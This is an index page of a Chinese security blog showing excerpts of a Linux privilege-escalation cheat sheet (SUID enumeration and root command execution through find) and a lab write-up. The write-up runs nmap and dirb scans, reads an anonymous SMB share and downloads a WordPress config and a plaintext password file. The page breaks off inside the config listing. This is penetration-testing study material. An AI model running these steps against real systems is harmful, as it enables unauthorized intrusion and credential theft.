<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png"><link rel="mask-icon" href="/images/logo.svg" color="#222"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><script id="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"www.divint3.cn",root:"/",scheme:"Pisces",version:"7.8.0",exturl:!1,sidebar:{position:"left",display:"post",padding:18,offset:12,onmobile:!1},copycode:{enable:!1,show_result:!1,style:null},back2top:{enable:!0,sidebar:!1,scrollpercent:!1},bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!1,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"tabs",active:null,storage:!0,lazyload:!1,nav:null},algolia:{hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}},localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},path:"search.xml"}</script><meta name="description" content="おかわいいこと"><meta property="og:type" content="website"><meta property="og:title" content="HexBlog"><meta property="og:url" content="https://www.divint3.cn/page/11/index.html"><meta property="og:site_name" content="HexBlog"><meta property="og:description" content="おかわいいこと"><meta property="og:locale" content="zh_CN"><meta property="article:author" content="Divint3"><meta name="twitter:card" content="summary"><link rel="canonical" href="https://www.divint3.cn/page/11/"><script id="page-configurations">CONFIG.page={sidebar:"",isHome:!0,isPost:!1,lang:"zh-CN"}</script><title>HexBlog</title><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript><link rel="alternate" href="/atom.xml" title="HexBlog" type="application/atom+xml">
</head><body itemscope itemtype="http://schema.org/WebPage"><div class="container use-motion"><div class="headband"></div><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div></div><div class="site-meta"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span><h1 class="site-title">HexBlog</h1><span class="logo-line-after"><i></i></span></a></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul id="menu" class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section">首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section">分类</a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger">搜索</a></li></ul></nav><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"><input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div id="search-result"><div id="no-result"><i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></div></header><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span>0%</span></div><main class="main"><div class="main-inner"><div class="content-wrap"><div class="content index posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.divint3.cn/%E6%B8%97%E9%80%8F%E5%90%88%E9%9B%86/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/head.png"><meta itemprop="name" content="Divint3"><meta itemprop="description" content="おかわいいこと"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="HexBlog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/%E6%B8%97%E9%80%8F%E5%90%88%E9%9B%86/" class="post-title-link" itemprop="url">渗透合集</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2019-05-29 01:03:11" itemprop="dateCreated datePublished" datetime="2019-05-29T01:03:11+08:00">2019-05-29</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-06-08 20:21:50" itemprop="dateModified" datetime="2020-06-08T20:21:50+08:00">2020-06-08</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/linux%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">linux渗透</span></a></span></span></div></header><div class="post-body" itemprop="articleBody"><h3 id="提权相关">提权相关</h3><p>查看系统上运行的所有SUID可执行文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">$ find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p>以上所有二进制文件都将以root用户权限执行，因为它们的权限中包含"s"，并且对应的是root权限。</p><p>如果Find命令也是以Suid权限运行的话，则将通过find执行的所有命令都会以root权限执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">touch</span> pentestlab</span><br><span class="line">$ find pentestlab -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br></pre></td></tr></table></figure>大部分Linux操作系统都安装了netcat，因此也可以被利用来将权限提升至root。<div class="post-button"><a class="btn" href="/%E6%B8%97%E9%80%8F%E5%90%88%E9%9B%86/#more" rel="contents">阅读全文 &raquo;</a></div></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.divint3.cn/%E9%9D%B6%E5%9C%BA63/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/head.png"><meta itemprop="name" content="Divint3"><meta itemprop="description" content="おかわいいこと"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="HexBlog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/%E9%9D%B6%E5%9C%BA63/" class="post-title-link" itemprop="url">靶场63</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2019-05-27 23:23:51" itemprop="dateCreated datePublished" datetime="2019-05-27T23:23:51+08:00">2019-05-27</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-06-08 18:41:32" itemprop="dateModified" datetime="2020-06-08T18:41:32+08:00">2020-06-08</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a></span></span></div></header><div class="post-body" itemprop="articleBody"><p>先看看网站源代码 找到图片存放的位置,看到一个特殊文件名,base64解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AAEAAQAAAAAAAAdJAAAAJDhiNGY1YTk3LTQ3NTctNDE1Ny1hZmU4LTlhMWE4</span><br><span class="line">I$8b4f5a97-4757-4157-afe8-9a1a8</span><br></pre></td></tr></table></figure><p>nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># divint3 @ Divint3 in ~ [21:49:41] C:130</span></span><br><span class="line">$ nmap 172.17.135.63 -sV -Pn</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2019-05-27 21:53 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.17.135.63</span><br><span class="line">Host is up (0.020s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">3306/tcp open  mysql       MySQL (unauthorized)</span><br><span class="line">6667/tcp open  irc         InspIRCd</span><br><span class="line">Service Info: Hosts: LAZYSYSADMIN, Admin.<span class="built_in">local</span>; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 11.79 seconds</span><br><span class="line"></span><br><span class="line"><span class="comment"># divint3 @ Divint3 in ~ [21:53:15] </span></span><br><span class="line">$ nmap 172.17.135.63 -sV -Pn -A</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2019-05-27 21:53 CST</span><br><span class="line">Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE Timing: About 99.87% <span class="keyword">done</span>; ETC: 21:54 (0:00:00 remaining)</span><br><span class="line">Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE Timing: About 99.87% <span class="keyword">done</span>; ETC: 21:54 (0:00:00 remaining)</span><br><span class="line">Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE Timing: About 99.87% <span class="keyword">done</span>; ETC: 21:54 (0:00:00 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.17.135.63</span><br><span class="line">Host is up (0.015s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 b5:38:66:0f:a1:ee:<span class="built_in">cd</span>:41:69:3b:82:cf:ad:a1:f7:13 (DSA)</span><br><span class="line">|   2048 58:5a:63:69:d0:da:<span class="built_in">dd</span>:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)</span><br><span class="line">|_  256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-generator: Silex v2.2.7</span><br><span class="line">| http-robots.txt: 4 disallowed entries </span><br><span class="line">|_/old/ /test/ /TR2/ /Backnode_files/</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: Backnode</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">3306/tcp open  mysql       MySQL (unauthorized)</span><br><span class="line">6667/tcp open  irc         InspIRCd</span><br><span class="line">| irc-info: </span><br><span class="line">|   server: Admin.<span class="built_in">local</span></span><br><span class="line">|   <span class="built_in">users</span>: 1.0</span><br><span class="line">|   servers: 1</span><br><span class="line">|   chans: 0</span><br><span class="line">|   lusers: 1</span><br><span class="line">|   lservers: 0</span><br><span class="line">|   <span class="built_in">source</span> ident: nmap</span><br><span class="line">|   <span class="built_in">source</span> host: 10.160.110.191</span><br><span class="line">|_  error: Closing <span class="built_in">link</span>: (nmap@10.160.110.191) [Client exited]</span><br><span class="line">Service Info: Hosts: LAZYSYSADMIN, Admin.<span class="built_in">local</span>; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 40m48s, deviation: 0s, median: 40m48s</span><br><span class="line">|_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: lazysysadmin</span><br><span class="line">|   NetBIOS computer name: LAZYSYSADMIN\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: lazysysadmin</span><br><span class="line">|_  System time: 2019-05-28T00:34:48+10:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smbv2-enabled: Server supports SMBv2 protocol</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 22.90 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p>祭出dirb</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Mon May 27 21:38:27 2019</span><br><span class="line">URL_BASE: http://172.17.135.63/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://172.17.135.63/ ----</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/apache/                                                                                                                                                    </span><br><span class="line">+ http://172.17.135.63/index.html (CODE:200|SIZE:36072)                                                                                                                                        </span><br><span class="line">+ http://172.17.135.63/info.php (CODE:200|SIZE:77255)                                                                                                                                          </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/javascript/                                                                                                                                                </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/old/                                                                                                                                                       </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/phpmyadmin/                                                                                                                                                </span><br><span class="line">+ http://172.17.135.63/robots.txt (CODE:200|SIZE:92)                                                                                                                                           </span><br><span class="line">+ http://172.17.135.63/server-status (CODE:403|SIZE:293)                                                                                                                                       </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/test/                                                                                                                                                      </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/wordpress/                                                                                                                                                 </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/wp/                                                                                                                                                        </span><br></pre></td></tr></table></figure><p></p><p>匿名访问smb</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># divint3 @ Divint3 in ~ [22:46:26] </span></span><br><span class="line">$ smbclient -L 172.17.135.63    </span><br><span class="line">WARNING: The <span class="string">&quot;syslog&quot;</span> option is deprecated</span><br><span class="line">Enter divint3<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Sharename       Type      Comment</span></span><br><span class="line"><span class="string">        ---------       ----      -------</span></span><br><span class="line"><span class="string">        print$          Disk      Printer Drivers</span></span><br><span class="line"><span class="string">        share$          Disk      Sumshare</span></span><br><span class="line"><span class="string">        IPC$            IPC       IPC Service (Web server)</span></span><br><span class="line"><span class="string">Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Server               Comment</span></span><br><span class="line"><span class="string">        ---------            -------</span></span><br><span class="line"><span class="string">        DESKTOP-IN4T2GV      </span></span><br><span class="line"><span class="string">        LAZYSYSADMIN         Web server</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Workgroup            Master</span></span><br><span class="line"><span class="string">        ---------            -------</span></span><br><span class="line"><span class="string">        WORKGROUP            DESKTOP-IN4T2GV</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># divint3 @ Divint3 in ~ [22:20:32] </span></span><br><span class="line"><span class="string">$ smbclient //172.17.135.63/share$</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">WARNING: The &quot;syslog&quot; option is deprecated</span></span><br><span class="line"><span class="string">Enter divint3&#x27;</span>s password: </span><br><span class="line">Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Tue Aug 15 19:05:52 2017</span><br><span class="line">  ..                                  D        0  Mon Aug 14 20:34:47 2017</span><br><span class="line">  wordpress                           D        0  Tue Aug 15 19:21:08 2017</span><br><span class="line">  Backnode_files                      D        0  Mon Aug 14 20:08:26 2017</span><br><span class="line">  wp                                  D        0  Tue Aug 15 18:51:23 2017</span><br><span class="line">  deets.txt                           N      139  Mon Aug 14 20:20:05 2017</span><br><span class="line">  robots.txt                          N       92  Mon Aug 14 20:36:14 2017</span><br><span class="line">  todolist.txt                        N       79  Mon Aug 14 20:39:56 2017</span><br><span class="line">  apache                              D        0  Mon Aug 14 20:35:19 2017</span><br><span class="line">  index.html                          N    36072  Sun Aug  6 13:02:15 2017</span><br><span class="line">  info.php                            N       20  Tue Aug 15 18:55:19 2017</span><br><span class="line">  <span class="built_in">test</span>                                D        0  Mon Aug 14 20:35:10 2017</span><br><span class="line">  old                                 D        0  Mon Aug 14 20:35:13 2017</span><br><span class="line"></span><br><span class="line">                3029776 blocks of size 1024. 1237820 blocks available</span><br><span class="line">smb: \&gt; get todolist.txt </span><br><span class="line">getting file \todolist.txt of size 79 as todolist.txt (8.6 KiloBytes/sec) (average 8.6 KiloBytes/sec)</span><br><span class="line">smb: \&gt; get deets.txt </span><br><span class="line">getting file \deets.txt of size 139 as deets.txt (5.0 KiloBytes/sec) (average 5.9 KiloBytes/sec)</span><br><span class="line">smb: \&gt; </span><br><span class="line">smb: \&gt; <span class="built_in">cd</span> wordpress</span><br><span class="line">smb: \wordpress\&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Tue Aug 15 19:21:08 2017</span><br><span class="line">  ..                                  D        0  Tue Aug 15 19:05:52 2017</span><br><span class="line">  wp-config-sample.php                N     2853  Wed Dec 16 17:58:26 2015</span><br><span class="line">  wp-trackback.php                    N     4513  Sat Oct 15 03:39:28 2016</span><br><span class="line">  wp-admin                            D        0  Thu Aug  3 05:02:02 2017</span><br><span class="line">  wp-settings.php                     N    16200  Fri Apr  7 02:01:42 2017</span><br><span class="line">  wp-blog-header.php                  N      364  Sat Dec 19 19:20:28 2015</span><br><span class="line">  index.php                           N      418  Wed Sep 25 08:18:11 2013</span><br><span class="line">  wp-cron.php                         N     3286  Mon May 25 01:26:25 2015</span><br><span class="line">  wp-links-opml.php                   N     2422  Mon Nov 21 10:46:30 2016</span><br><span class="line">  readme.html                         N     7413  Mon Dec 12 16:01:39 2016</span><br><span class="line">  wp-signup.php                       N    29924  Tue Jan 24 19:08:42 2017</span><br><span class="line">  wp-content                          D        0  Mon Aug 21 18:07:27 2017</span><br><span class="line">  license.txt                         N    19935  Tue Jan  3 01:58:42 2017</span><br><span class="line">  wp-mail.php                         N     8048  Wed Jan 11 13:13:43 2017</span><br><span class="line">  wp-activate.php                     N     5447  Wed Sep 28 05:36:28 2016</span><br><span class="line">  .htaccess                           H       35  Tue Aug 15 19:40:13 2017</span><br><span class="line">  xmlrpc.php                          N     3065  Thu Sep  1 00:31:29 2016</span><br><span class="line">  wp-login.php                        N    34327  Sat May 13 01:12:46 2017</span><br><span class="line">  wp-load.php                         N     3301  Tue Oct 25 11:15:30 2016</span><br><span class="line">  wp-comments-post.php                N     1627  Mon Aug 29 20:00:32 2016</span><br><span class="line">  wp-config.php                       N     3703  Mon Aug 21 17:25:14 2017</span><br><span class="line">  wp-includes                         D        0  Thu Aug  3 05:02:03 2017</span><br><span class="line"></span><br><span class="line">                3029776 blocks of size 1024. 1237744 blocks available</span><br><span class="line">smb: \wordpress\&gt; get wp-config.php </span><br><span class="line">getting file \wordpress\wp-config.php of size 3703 as wp-config.php (452.0 KiloBytes/sec) (average 452.0 KiloBytes/sec)</span><br><span class="line">smb: \wordpress\&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>deets.txt<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CBF Remembering all these passwords.</span><br><span class="line"></span><br><span class="line">Remember to remove this file and update your password after we push out the server.</span><br><span class="line"></span><br><span class="line">Password 12345</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p>todolist.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Prevent users from being able to view to web root using the local file browser</span><br></pre></td></tr></table></figure><p></p><p>wp-config.php的内容包含数据库配置,故下载</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The base configuration for WordPress</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The wp-config.php creation script uses this file during the</span></span><br><span 